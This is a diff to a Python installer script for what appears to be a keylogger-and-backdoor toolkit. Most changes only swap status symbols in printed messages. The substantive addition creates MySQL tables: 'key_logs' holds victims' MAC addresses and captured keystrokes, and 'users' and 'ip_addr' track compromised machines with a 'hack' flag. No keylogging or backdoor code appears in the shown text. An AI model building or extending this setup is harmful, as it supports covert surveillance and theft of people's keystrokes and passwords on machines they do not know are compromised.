@@ -47,10 +47,10 @@ def check_for_dependency():
                         dependancy_edit = dependancy
 
                     __import__('imp').find_module(dependancy_edit)
-                    print("{:<18}".format(dependancy) + colors.Green + "[+]Found" + colors.RESET)
+                    print("{:<18}".format(dependancy) + colors.Green + "[✓]Found" + colors.RESET)
                 except ImportError:
                     not_installed.append(dependancy)
-                    print("{:<18}".format(dependancy) + colors.Red + "[-]Not Found" + colors.RESET)
+                    print("{:<18}".format(dependancy) + colors.Red + "[✘]Not Found" + colors.RESET)
 
     global check_list
     if len(not_installed) == 0:
@@ -68,12 +68,12 @@ def install_packages(packages):
         for item in packages:
             print(colors.Cyan + f'[!]Installing {item} .......' + colors.RESET)
             check_output('pip3 install {}'.format(item), shell=True, stderr=devnull)
-            print(colors.Green + f'[+]Successfully installed {item}')
+            print(colors.Green + f'[✓]Successfully installed {item}')
         check_list['Installed missing dependencies'] = True
     
     except CalledProcessError:
         check_list['Installed missing dependencies'] = False
-        print(colors.Red + f'[-]Error occurred while installing {item}' + colors.RESET)
+        print(colors.Red + f'[✘]Error occurred while installing {item}' + colors.RESET)
 
 
 def create_virtual_env():
@@ -92,28 +92,28 @@ def create_virtual_env():
             pass
 
         check_output('mkdir venv',shell=True, stderr=devnull)
-        print(colors.Green + '[+]venv Folder created..' + colors.RESET)
+        print(colors.Green + '[✓]venv Folder created..' + colors.RESET)
 
         # creating virtula environment
         check_output('virtualenv venv', shell=True, stderr=devnull)
-        print(colors.Green + '[+]Virtual environment created successfully' + colors.RESET)
+        print(colors.Green + '[✓]Virtual environment created successfully' + colors.RESET)
 
         # activating virtual environment
         venv_file_path = program_path + '/venv/bin/activate_this.py'
         execfile_y(venv_file_path, dict(__file__=venv_file_path))
-        print(colors.Green + '[+]Virtual Environment Activated!!')
+        print(colors.Green + '[✓]Virtual Environment Activated!!')
 
         # install packages inside virtual environment
         for package in dependencies:
             if package != 'virtualenv':
                 check_output(f'pip install {package}', shell=True)
-                print(colors.Green + f'[+]Successfully installed package {colors.BOLD}{colors.ULINE}{package}' + colors.RESET)
+                print(colors.Green + f'[✓]Successfully installed package {colors.BOLD}{colors.ULINE}{package}' + colors.RESET)
 
         check_list['Virtual Environment Creation'] = True
 
     except CalledProcessError as error:
-        print(colors.Red + '[-]Error while ececuting commands...')
-        print(f'[-]{error}' + colors.RESET)
+        print(colors.Red + '[✘]Error while ececuting commands...')
+        print(f'[✘]{error}' + colors.RESET)
         check_list['Virtual Environment Creation'] = False
 
 
@@ -165,21 +165,35 @@ def configure_mysql():
                 database=Database,
                 port=Port
             )
-            print(colors.Green + '[+]Connected successfully')
+            print(colors.Green + '[✓]Connected successfully')
 
-            database_cusrsor = database.cursor()
-            command = "CREATE TABLE IF NOT EXISTS `key_logs`(`p_id` int(11) PRIMARY KEY NOT NULL, `mac_address` text, `keys` text);"
-            database_cusrsor.execute(command)
+            print(colors.Yellow + '[!]Executing commands for create tables for keylogger')
+            try:
+                database_cusrsor = database.cursor()
+                command = "CREATE TABLE IF NOT EXISTS `key_logs`(`p_id` int(11) PRIMARY KEY NOT NULL, `mac_address` text, `keys` text);"
+                database_cusrsor.execute(command)
+                print(colors.Green + '[✓]Table created successfully')
+            except:
+                print(colors.Red + '[✘]Error while creating the table')
+
+            print(colors.Yellow + '[!]Executing commands for create tables for backdoor')
+            try:
+                database_cusrsor = database.cursor()
+                command = "CREATE TABLE IF NOT EXISTS ip_addr(id int(11) not null, ip text not null); CREATE TABLE IF NOT EXISTS users(p_id int(11) PRIMARY KEY not null,name text not null,mac_addr text,hack int(1) not null);"
+                database_cusrsor.execute(command)
+                print(colors.Green + '[✓]Table created successfully')
+            except:
+                print(colors.Red + '[✘]Error while creating the table')
 
             database.commit()
 
-            print(colors.Green + '[+]Database configured successfully')
+            print(colors.Green + '[✓]Database configured successfully')
 
             check_list['MYSQL Configuration'] = True
 
     except Exception as error:
-        print(colors.Red + '[-]Error Occured while operation')
-        print(f'[-]ERROR: {error}' + colors.RESET)
+        print(colors.Red + '[✘]Error Occured while operation')
+        print(f'[✘]ERROR: {error}' + colors.RESET)
         check_list['MYSQL Configuration'] = False
 
 
@@ -200,9 +214,9 @@ def print_configuration_report():
             print("\t{:35} ".format(key) + colors.Yellow + 'SKIPPED' + colors.RESET)
 
     if not error:
-        print(colors.Green + '\n[+]Installation successfull and you are good to continue\n\n' + colors.RESET)
+        print(colors.Green + '\n[✓]Installation successfull and you are good to continue\n\n' + colors.RESET)
     else:
-        print(colors.Red + '\n[-]Installation unsuccessfull please re install')
+        print(colors.Red + '\n[✘]Installation unsuccessfull please re install')
 
 ##############################################################################
 #                               MAIN PROGRAM                                 #
@@ -229,7 +243,7 @@ try:
         logo_printer.print_help()
 
     else:
-        print(colors.Red + '[-]Incorrect argument')
+        print(colors.Red + '[✘]Incorrect argument')
         exit(0)
 
 except IndexError:
